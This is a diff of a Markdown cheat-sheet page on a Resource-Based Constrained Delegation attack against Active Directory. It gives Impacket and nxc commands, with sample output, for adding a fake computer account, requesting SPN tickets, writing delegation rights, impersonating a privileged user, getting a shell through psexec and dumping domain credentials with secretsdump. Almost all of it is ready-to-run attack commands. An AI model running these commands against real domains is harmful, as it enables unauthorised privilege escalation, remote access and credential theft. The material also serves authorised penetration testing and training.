@@ -1,7 +1,7 @@
 ---
 title: "RBCD Attack"
 date: 2025-7-25
-tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping"]
+tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping", "Genericall", "WriteAccountRestrictions"]
 ---
 
 ### RBCD Attack
@@ -10,9 +10,10 @@ tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Tic
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 0. Check Machine Account Quota
+#### 1. Create a Fake Computer \[Optional\]
 
 ```console
+# Check machine account quota
 nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M maq
 ```
 
@@ -24,10 +25,9 @@ MAQ         10.10.11.10      389    DC               [*] Getting the MachineAcco
 MAQ         10.10.11.10      389    DC               MachineAccountQuota: 10
 ```
 
-#### 1. Add a Fake Computer
-
 ```console
-impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+# Add a fake computer
+impacket-addcomputer -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 ```console {class="sample-code"}
@@ -37,10 +37,36 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Successfully added machine account EvilComputer$ with password Test1234.
 ```
 
-#### 2. RBCD Attack
+#### 2. Get Service Principle Name (SPN) \[Optional\]
 
 ```console
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+# Password
+impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
+```
+
+```console {class="sample-code"}
+$ impacket-GetUserSPNs 'example.com/svc_web:Password' -dc-ip 10.10.132.53 -request                                 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
+MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
+```
+
+```console
+# Kerberos
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -k
+```
+
+```console
+# If NTLM auth is disabled
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
+```
+
+#### 3. RBCD Attack \[Control over an Account with SPN\]
+
+```console
+impacket-rbcd -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 ```console {class="sample-code"}
@@ -54,10 +80,15 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
 ```
 
-#### 3. Impersonate
+<small>*Note: Delegate from an account with SPN, which may not be a computer.*</small>
+<br>
+<small>*Note: Remove trailing $ if not a machine account.*</small>
+
+#### 4. Impersonate
 
 ```console
-sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC_IP> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
+# Password
+sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER>:<COMPUTER_PASSWORD>'
 ```
 
 ```console {class="sample-code"}
@@ -72,21 +103,26 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
 ```
 
-#### 4. Import Ticket
+```console
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER' -hashes ':<HASH>'
+```
+
+#### 5. Import Ticket
 
 ```console
-export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
+export KRB5CCNAME='<CCACHE_FILE>'
 ```
 
 ```console {class="sample-code"}
-$ export KRB5CCNAME=administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
+$ export KRB5CCNAME='administrator@cifs_dc.example.com@EXAMPLE.COM.ccache'
 ```
 
-#### 5. Post-Attack
+#### 6. Post-Attack
 
 ```console
 # Remote
-sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/<TARGET_USER>@<TARGET_DOMAIN> -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -101,7 +137,7 @@ C:\>
 
 ```console
 # Or secretsdump
-impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
+impacket-secretsdump <TARGET_USER>@<TARGET_DOMAIN> -k -no-pass
 ```
 
 ```console {class="sample-code"}
